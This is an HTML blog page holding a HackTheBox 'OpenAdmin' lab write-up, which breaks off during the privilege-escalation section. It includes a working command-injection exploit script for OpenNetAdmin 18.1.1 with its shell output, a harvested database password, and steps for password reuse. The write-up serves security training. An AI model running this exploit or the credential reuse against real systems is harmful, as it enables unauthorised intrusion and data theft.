<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>HackTheBox - OpenAdmin | Ef's log</title><meta name=keywords content="HackTheBox,Writeup,Cyber Security,Pentesting"><meta name=description content="Exploiting OpenNetAdmin vulnerability and sudo nano"><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.medium.com/hack-the-box-openadmin-10-10-10-171-writeup-30c336453303><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.bd459bfe4940cb0279a97213c67be3816bd3751510c3b6af22df24e8740767ba.css integrity="sha256-vUWb/klAywJ5qXITxnvjgWvTdRUQw7avIt8k6HQHZ7o=" rel="preload stylesheet" as=style><link crossorigin=anonymous rel=preload as=fetch href=https://fahmifj.github.io/index.json><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/search.min.dbf3c8b1e1d3feb24da21a556bdfb2f51a0273aa11efcd4640113536ee29d424.js integrity="sha256-2/PIseHT/rJNohpVa9+y9RoCc6oR781GQBE1Nu4p1CQ="></script>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.22059b46810f6ad868c7821e09643fcd3324a7aece939a3b9d810ddf8cc89e0d.js integrity="sha256-IgWbRoEPathox4IeCWQ/zTMkp67Ok5o7nYEN34zIng0=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.102.1"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDN0GP97D1",{anonymize_ip:!1})}</script><meta property="og:title" content="HackTheBox - OpenAdmin"><meta property="og:description" content="Exploiting OpenNetAdmin vulnerability and sudo nano"><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/hackthebox/openadmin/"><meta property="og:image" content="https://fahmifj.github.io/hackthebox/openadmin/imgs/e747b28228244e00821545e997ebe9ef.png"><meta property="article:section" content="hackthebox"><meta property="article:published_time" content="2020-05-01T20:33:36+00:00"><meta property="article:modified_time" content="2021-04-02T04:25:51+07:00"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/ophiuchi/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/traverxec/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/heist/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/active/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/shocker/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/atom/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://fahmifj.github.io/hackthebox/openadmin/imgs/e747b28228244e00821545e997ebe9ef.png"><meta name=twitter:title content="HackTheBox - OpenAdmin"><meta name=twitter:description content="Exploiting OpenNetAdmin vulnerability and sudo nano"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HackTheBox","item":"https://fahmifj.github.io/hackthebox/"},{"@type":"ListItem","position":2,"name":"HackTheBox - OpenAdmin","item":"https://fahmifj.github.io/hackthebox/openadmin/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - OpenAdmin","name":"HackTheBox - OpenAdmin","description":"Exploiting OpenNetAdmin vulnerability and sudo nano","keywords":["HackTheBox","Writeup","Cyber Security","Pentesting"],"articleBody":"OpenAdmin starts off by finding an instance of OpenNetAdmin. This application is known to be vulnerable to a remote code execution, which then leveraged to gain a foothold on the system. Enumerating inside the machine reveals a database password that is reused by one of the users. This user has access to internal web which can be exploited to obtain the SSH key of another user. The second user is allowed to run a nano editor with sudo privileges, and this can be abused to gain root access.\nSkills Learned Exploitation of OpenNetAdmin 18.1.1 Sudo exploitation on nano. Tools Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux Dirb - Preinstalled in Kali Linux John The Ripper - https://www.openwall.com/john/ Reconnaissance Nmap → root@iamf «openadmin» «10.10.14.7» $ nmap -sV -sC -oA OpenAdmin '10.10.10.171' -v -sC, to scan with default script -sV, to scan service version -oA, to save the output to all formats -v, verbose mode PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA) | 256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA) |_ 256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel From the scan results, nmap found two open ports:\nAn SSH service running on port 22 An HTTP service running on port 80 As SSH usually requires valid credentials and there’s is no straight exploit yet, hence further enumeration is needed.\nEnumeration TCP 80 - Website Visiting the standard http port only displays the Apache default page.\nDirectory Brute Force - dirb Running dirb against the web successfully discovered a few hidden paths.\n→ root@iamf «openadmin» «10.10.14.7» $ dirb http://10.10.10.171/ /usr/share/wordlists/dirb/common.txt -r ...... ---- Scanning URL: http://10.10.10.171/ ---- ==\u003e DIRECTORY: http://10.10.10.171/artwork/ + http://10.10.10.171/index.html(CODE:200|SIZE:10918) ==\u003e DIRECTORY: http:/10.10.10.171/music/ + http://10.10.10.171/server-status (CODE:200|SIZE:278) ...... /artwork/ Nothing here.\n/music/ The /music home page provides a login menu that points to http://openadmin.htb/ona\n/ona/ Visiting /ona/ brings me to an instance of OpenNetAdmin. It is a software for managing network related things.\nThere’s a warning on the page. It’s complaining about not running the latest version compared to the one currently in use (v18.1.1)\nFoothold Shell as www-data OpenNetAdmin 18.1.1 RCE Based on the version above, a quick search on exploit-db shows that the current instance of OpenNetAdmin is vulnerable to a remote code execution. The exploit PoC source code is as follows:\n#!/bin/bash URL=\"${1}\" while true;do echo -n \"$ \"; read cmd curl --silent -d \"xajax=window_submit\u0026xajaxr=1574117726710\u0026xajaxargs[]=tooltips\u0026xajaxargs[]=ip%3D%3E;echo \\\"BEGIN\\\";${cmd};echo \\\"END\\\"\u0026xajaxargs[]=ping\" \"${URL}\" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1 done I saved the exploit to a file called OpenRCE.sh. I ran the exploit and it resulted in a shell access as www-data\n→ kali@kali «openadmin» «10.10.14.7» $ ./OpenRCE.sh http://10.10.10.171/ona/ $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) $ hostname openadmin $ ip a 1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: ens160: mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:50:56:b9:72:3a brd ff:ff:ff:ff:ff:ff inet 10.10.10.171/24 brd 10.10.10.255 scope global ens160 valid_lft forever preferred_lft forever inet6 dead:beef::250:56ff:feb9:723a/64 scope global dynamic mngtmpaddr valid_lft 86350sec preferred_lft 14350sec inet6 fe80::250:56ff:feb9:723a/64 scope link valid_lft forever preferred_lft forever Privilege Escalation Shell as jimmy Enumeration Upon enumerating the current working directory, a database credential is found in ./local/config/database_settings.inc.php.\n$ cat ./local/config/database_settings.inc.php \u003c?php $ona_contexts=array ( 'DEFAULT' =\u003e array ( 'databases' =\u003e array ( 0 =\u003e array ( 'db_type' =\u003e 'mysqli', 'db_host' =\u003e 'localhost', 'db_login' =\u003e 'ona_sys', 'db_passwd' =\u003e 'n1nj4W4rri0R!', 'db_database' =\u003e 'ona_default', 'db_debug' =\u003e false, ), ), 'description' =\u003e 'Default data context', 'context_color' =\u003e '#D3DBFF', ), ); SSH access The password worked for user jimmy, but the user flag can not be found in jimmy’s home directory.\nShell as joanna Enumeration The find command is issued again to search files that is accessible or owned by user jimmy.\njimmy@openadmin:~$ find / -type f -user jimmy 2\u003e/dev/null ...... /var/www/internal/main.php /var/www/internal/logout.php /var/www/internal/login.php ...... It successfully reveals that user jimmy has access to files in /var/www/internal/.\nBased on apache config, /var/www/internal is currently hosted locally on port 52846.\njimmy@openadmin:~$ cat /etc/apache2/sites-enabled/internal.conf Listen 127.0.0.1:52846 ServerName internal.openadmin.htb DocumentRoot /var/www/internal AssignUserID joanna joanna ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined Code review - Improper redirection After inspecting the main.php source code from /var/www/internal/, a logic flaw was found on the first line.\njimmy@openadmin:/var/www/internal/$ cat main.php \u003c?php session_start(); if (!isset ($_SESSION['username'])) { header(\"Location: /index.php\"); }; # Open Admin Trusted # OpenAdmin $output = shell_exec('cat /home/joanna/.ssh/id_rsa'); echo \"$output\"; ?\u003e Don't forget your \"ninja\" password Click here to logout ","wordCount":"1104","inLanguage":"en","image":"https://fahmifj.github.io/hackthebox/openadmin/imgs/e747b28228244e00821545e997ebe9ef.png","datePublished":"2020-05-01T20:33:36.581Z","dateModified":"2021-04-02T04:25:51+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/hackthebox/openadmin/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class="header sticky"><nav id=navbar class=nav><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="Fahmi FJ">F's log</a></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/blog/ title=blog>blog</a></li><li><a href=https://fahmifj.github.io/ctf/ title=ctf>ctf</a></li><li><a href=https://fahmifj.github.io/series/ title=series>series</a></li><li><a href=https://fahmifj.github.io/archives/ title=archives>archives</a></li></ul><div class=search-container><div id=searchBox><input class=searchInput id=searchInput aria-label=search type=search><div class=searchResults-container><span class="search-results hidden" id=searchResults aria-label="search results"></span></div></div><button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><div id=mask></div><main class=main><div class=content-wrapper><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/hackthebox/>HackTheBox</a></div><h1 class=post-title>HackTheBox - OpenAdmin</h1><p class=post-description>Exploiting OpenNetAdmin vulnerability and sudo nano</p><div class=post-meta><span class=author>Fahmi FJ</span>&nbsp;&#183;&nbsp;<span class=date>May 01, 2020
<span class=date-update>(Imported: April 02, 2021)</span></span>&nbsp;&#183;&nbsp;<span class=meta-read>6 min read</span></div><hr><div class=series-info>Series:&nbsp;<a href=https://fahmifj.github.io/series/oscp-like/>OSCP like</a></div></header><div class=post-content-container><aside class=toc><div class=inner><ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#nmap aria-label=Nmap>Nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#tcp-80---website aria-label="TCP  80 - Website">TCP  80 - Website</a></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#shell-as-www-data aria-label="Shell as www-data">Shell as www-data</a></li></ul></li><li><a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul><li><a href=#shell-as-jimmy aria-label="Shell as jimmy">Shell as jimmy</a></li><li><a href=#shell-as-joanna aria-label="Shell as joanna">Shell as joanna</a></li><li><a href=#shell-as-root aria-label="Shell as root">Shell as root</a></li></ul></li></ul></div></aside><div class=post-content><figure class=entry-cover><img srcset="https://fahmifj.github.io/hackthebox/openadmin/imgs/e747b28228244e00821545e997ebe9ef_hua9653e90d2660ad3696baac03724044f_179086_360x0_resize_box_3.png 360w ,https://fahmifj.github.io/hackthebox/openadmin/imgs/e747b28228244e00821545e997ebe9ef_hua9653e90d2660ad3696baac03724044f_179086_480x0_resize_box_3.png 480w ,https://fahmifj.github.io/hackthebox/openadmin/imgs/e747b28228244e00821545e997ebe9ef_hua9653e90d2660ad3696baac03724044f_179086_720x0_resize_box_3.png 720w ,https://fahmifj.github.io/hackthebox/openadmin/imgs/e747b28228244e00821545e997ebe9ef.png 826w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/hackthebox/openadmin/imgs/e747b28228244e00821545e997ebe9ef.png alt=OpenAdmin width=826 height=529><p>It&rsquo;s never too late to start</p></figure><p>OpenAdmin starts off by finding an instance of OpenNetAdmin. This application is known to be vulnerable to a remote code execution, which then leveraged to gain a foothold on the system. Enumerating inside the machine reveals a database password that is reused by one of the users. This user has access to internal web which can be exploited to obtain the SSH key of another user. The second user is allowed to run a <code>nano</code> editor with sudo privileges, and this can be abused to gain root access.</p><h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4><ul><li>Exploitation of OpenNetAdmin 18.1.1</li><li>Sudo exploitation on <code>nano</code>.</li></ul><h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4><ul><li>Kali Linux (Attacking Machine) - <a href=https://www.kali.org/>https://www.kali.org/</a></li><li>Nmap - Preinstalled in Kali Linux</li><li>Dirb - Preinstalled in Kali Linux</li><li>John The Ripper - <a href=https://www.openwall.com/john/>https://www.openwall.com/john/</a></li></ul><h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «openadmin» «10.10.14.7»
</span></span><span class=line><span class=cl>$ nmap -sV -sC -oA OpenAdmin <span class=s1>&#39;10.10.10.171&#39;</span> -v
</span></span></code></pre></div><ul><li><code>-sC</code>, to scan with default script</li><li><code>-sV</code>, to scan service version</li><li><code>-oA</code>, to save the output to all formats</li><li><code>-v</code>, verbose mode</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
</span></span><span class=line><span class=cl>| ssh-hostkey:
</span></span><span class=line><span class=cl>|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
</span></span><span class=line><span class=cl>|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
</span></span><span class=line><span class=cl>|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
</span></span><span class=line><span class=cl>|_http-server-header: Apache/2.4.29 (Ubuntu)
</span></span><span class=line><span class=cl>|_http-title: Apache2 Ubuntu Default Page: It works
</span></span><span class=line><span class=cl>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><p>From the scan results, <code>nmap</code> found two open ports:</p><ul><li>An SSH service running on port 22</li><li>An HTTP service running on port 80</li></ul><p>As SSH usually requires valid credentials and there&rsquo;s is no straight exploit yet, hence further enumeration is needed.</p><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=tcp-80---website>TCP  80 - Website<a class=anchor aria-hidden=true href=#tcp-80---website>#</a></h3><p>Visiting the standard http port only displays the Apache default page.</p><p><div class=img-container><img src=imgs/4fb96d89a99c4244bb54291abd974267.png alt=1ad0727e5956f0800cbe4ec0c02df451.png></div></p><h4 id=directory-brute-force---dirb>Directory Brute Force - dirb<a class=anchor aria-hidden=true href=#directory-brute-force---dirb>#</a></h4><p>Running <code>dirb</code> against the web successfully discovered a few hidden paths.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «openadmin» «10.10.14.7»
</span></span><span class=line><span class=cl>$ dirb http://10.10.10.171/ /usr/share/wordlists/dirb/common.txt -r
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl>---- Scanning URL: http://10.10.10.171/ ----
</span></span><span class=line><span class=cl><span class=o>==</span>&gt; DIRECTORY: http://10.10.10.171/artwork/
</span></span><span class=line><span class=cl>+ http://10.10.10.171/index.html<span class=o>(</span>CODE:200<span class=p>|</span>SIZE:10918<span class=o>)</span> 
</span></span><span class=line><span class=cl><span class=o>==</span>&gt; DIRECTORY: http:/10.10.10.171/music/
</span></span><span class=line><span class=cl>+ http://10.10.10.171/server-status <span class=o>(</span>CODE:200<span class=p>|</span>SIZE:278<span class=o>)</span>
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span></code></pre></div><h4 id=artwork>/artwork/<a class=anchor aria-hidden=true href=#artwork>#</a></h4><p>Nothing here.</p><p><div class=img-container><img src=imgs/image-20210402000812490.png alt=image-20210402000812490></div></p><h4 id=music>/music/<a class=anchor aria-hidden=true href=#music>#</a></h4><p>The <code>/music</code> home page provides a login menu that points to <code>http://openadmin.htb/ona</code></p><p><div class=img-container><img src=imgs/image-20210402000847660.png alt=image-20210402000847660></div></p><h4 id=ona>/ona/<a class=anchor aria-hidden=true href=#ona>#</a></h4><p>Visiting <code>/ona/</code> brings me to an instance of OpenNetAdmin. It is a software for managing network related things.</p><p><div class=img-container><img src=imgs/88b4ba1460574b0f88a4acd81e00d392.png alt=f0df4d83acc69be1e666eb6e40a73494.png></div></p><p>There&rsquo;s a warning on the page. It’s complaining about not running the latest version compared to the one currently in use (<code>v18.1.1</code>)</p><h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=shell-as-www-data>Shell as www-data<a class=anchor aria-hidden=true href=#shell-as-www-data>#</a></h3><h4 id=opennetadmin-1811-rce>OpenNetAdmin 18.1.1 RCE<a class=anchor aria-hidden=true href=#opennetadmin-1811-rce>#</a></h4><p>Based on the version above, a quick search on <code>exploit-db</code> shows that the current instance of OpenNetAdmin is vulnerable to a remote code execution. The <a href=https://www.exploit-db.com/exploits/47691>exploit PoC</a> source code is as follows:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=nv>URL</span><span class=o>=</span><span class=s2>&#34;</span><span class=si>${</span><span class=nv>1</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=k>while</span> true<span class=p>;</span><span class=k>do</span>
</span></span><span class=line><span class=cl> <span class=nb>echo</span> -n <span class=s2>&#34;</span>$<span class=s2> &#34;</span><span class=p>;</span> <span class=nb>read</span> cmd
</span></span><span class=line><span class=cl> curl --silent -d <span class=s2>&#34;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \&#34;BEGIN\&#34;;</span><span class=si>${</span><span class=nv>cmd</span><span class=si>}</span><span class=s2>;echo \&#34;END\&#34;&amp;xajaxargs[]=ping&#34;</span> <span class=s2>&#34;</span><span class=si>${</span><span class=nv>URL</span><span class=si>}</span><span class=s2>&#34;</span> <span class=p>|</span> sed -n -e <span class=s1>&#39;/BEGIN/,/END/ p&#39;</span> <span class=p>|</span> tail -n +2 <span class=p>|</span> head -n -1
</span></span><span class=line><span class=cl><span class=k>done</span>
</span></span></code></pre></div><p>I saved the exploit to a file called <code>OpenRCE.sh</code>. I ran the exploit and it resulted in a shell access as www-data</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «openadmin» «10.10.14.7» 
</span></span><span class=line><span class=cl>$ ./OpenRCE.sh http://10.10.10.171/ona/
</span></span><span class=line><span class=cl>$ id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span>
</span></span><span class=line><span class=cl>$ hostname
</span></span><span class=line><span class=cl>openadmin
</span></span><span class=line><span class=cl>$ ip a
</span></span><span class=line><span class=cl>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class=m>65536</span> qdisc noqueue state UNKNOWN group default qlen <span class=m>1000</span>
</span></span><span class=line><span class=cl>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
</span></span><span class=line><span class=cl>    inet 127.0.0.1/8 scope host lo
</span></span><span class=line><span class=cl>       valid_lft forever preferred_lft forever
</span></span><span class=line><span class=cl>    inet6 ::1/128 scope host 
</span></span><span class=line><span class=cl>       valid_lft forever preferred_lft forever
</span></span><span class=line><span class=cl>2: ens160: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class=m>1500</span> qdisc mq state UP group default qlen <span class=m>1000</span>
</span></span><span class=line><span class=cl>    link/ether 00:50:56:b9:72:3a brd ff:ff:ff:ff:ff:ff
</span></span><span class=line><span class=cl>    inet 10.10.10.171/24 brd 10.10.10.255 scope global ens160
</span></span><span class=line><span class=cl>       valid_lft forever preferred_lft forever
</span></span><span class=line><span class=cl>    inet6 dead:beef::250:56ff:feb9:723a/64 scope global dynamic mngtmpaddr 
</span></span><span class=line><span class=cl>       valid_lft 86350sec preferred_lft 14350sec
</span></span><span class=line><span class=cl>    inet6 fe80::250:56ff:feb9:723a/64 scope link 
</span></span><span class=line><span class=cl>       valid_lft forever preferred_lft forever
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=shell-as-jimmy>Shell as jimmy<a class=anchor aria-hidden=true href=#shell-as-jimmy>#</a></h3><h4 id=enumeration-1>Enumeration<a class=anchor aria-hidden=true href=#enumeration-1>#</a></h4><p>Upon enumerating the current working directory, a database credential is found in <code>./local/config/database_settings.inc.php</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ cat ./local/config/database_settings.inc.php
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$ona_contexts</span><span class=o>=</span>array <span class=o>(</span>
</span></span><span class=line><span class=cl>  <span class=s1>&#39;DEFAULT&#39;</span> <span class=o>=</span>&gt; 
</span></span><span class=line><span class=cl>  array <span class=o>(</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;databases&#39;</span> <span class=o>=</span>&gt; 
</span></span><span class=line><span class=cl>    array <span class=o>(</span>
</span></span><span class=line><span class=cl>      <span class=nv>0</span> <span class=o>=</span>&gt; 
</span></span><span class=line><span class=cl>      array <span class=o>(</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;db_type&#39;</span> <span class=o>=</span>&gt; <span class=s1>&#39;mysqli&#39;</span>,
</span></span><span class=line><span class=cl>        <span class=s1>&#39;db_host&#39;</span> <span class=o>=</span>&gt; <span class=s1>&#39;localhost&#39;</span>,
</span></span><span class=line><span class=cl>        <span class=s1>&#39;db_login&#39;</span> <span class=o>=</span>&gt; <span class=s1>&#39;ona_sys&#39;</span>,
</span></span><span class=line><span class=cl>        <span class=s1>&#39;db_passwd&#39;</span> <span class=o>=</span>&gt; <span class=s1>&#39;n1nj4W4rri0R!&#39;</span>,
</span></span><span class=line><span class=cl>        <span class=s1>&#39;db_database&#39;</span> <span class=o>=</span>&gt; <span class=s1>&#39;ona_default&#39;</span>,
</span></span><span class=line><span class=cl>        <span class=s1>&#39;db_debug&#39;</span> <span class=o>=</span>&gt; false,
</span></span><span class=line><span class=cl>      <span class=o>)</span>,
</span></span><span class=line><span class=cl>    <span class=o>)</span>,
</span></span><span class=line><span class=cl>    <span class=s1>&#39;description&#39;</span> <span class=o>=</span>&gt; <span class=s1>&#39;Default data context&#39;</span>,
</span></span><span class=line><span class=cl>    <span class=s1>&#39;context_color&#39;</span> <span class=o>=</span>&gt; <span class=s1>&#39;#D3DBFF&#39;</span>,
</span></span><span class=line><span class=cl>  <span class=o>)</span>,
</span></span><span class=line><span class=cl><span class=o>)</span><span class=p>;</span>
</span></span></code></pre></div><h4 id=ssh-access>SSH access<a class=anchor aria-hidden=true href=#ssh-access>#</a></h4><p>The password worked for user <code>jimmy</code>, but the user flag can not be found in <code>jimmy</code>’s home directory.</p><p><div class=img-container><img src=imgs/25ec2fca7eb84dad9f748aeb299ef35b.png alt=a0518e175f0d68951eac7bbb348b24e0.png></div></p><h3 id=shell-as-joanna>Shell as joanna<a class=anchor aria-hidden=true href=#shell-as-joanna>#</a></h3><h4 id=enumeration-2>Enumeration<a class=anchor aria-hidden=true href=#enumeration-2>#</a></h4><p>The <code>find</code> command is issued again to search files that is accessible or owned by user <code>jimmy</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>jimmy@openadmin:~$ find / -type f -user jimmy 2&gt;/dev/null
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl>/var/www/internal/main.php
</span></span><span class=line><span class=cl>/var/www/internal/logout.php
</span></span><span class=line><span class=cl>/var/www/internal/login.php
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span></code></pre></div><p>It successfully reveals that user <code>jimmy</code> has access to files in <code>/var/www/internal/</code>.</p><p>Based on apache config, <code>/var/www/internal</code> is currently hosted locally on port 52846.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>jimmy@openadmin:~$ cat /etc/apache2/sites-enabled/internal.conf 
</span></span><span class=line><span class=cl>Listen 127.0.0.1:52846
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;VirtualHost 127.0.0.1:52846&gt;
</span></span><span class=line><span class=cl>    ServerName internal.openadmin.htb
</span></span><span class=line><span class=cl>    DocumentRoot /var/www/internal
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;IfModule mpm_itk_module&gt;
</span></span><span class=line><span class=cl>AssignUserID joanna joanna
</span></span><span class=line><span class=cl>&lt;/IfModule&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    ErrorLog <span class=si>${</span><span class=nv>APACHE_LOG_DIR</span><span class=si>}</span>/error.log
</span></span><span class=line><span class=cl>    CustomLog <span class=si>${</span><span class=nv>APACHE_LOG_DIR</span><span class=si>}</span>/access.log combined
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;/VirtualHost&gt;
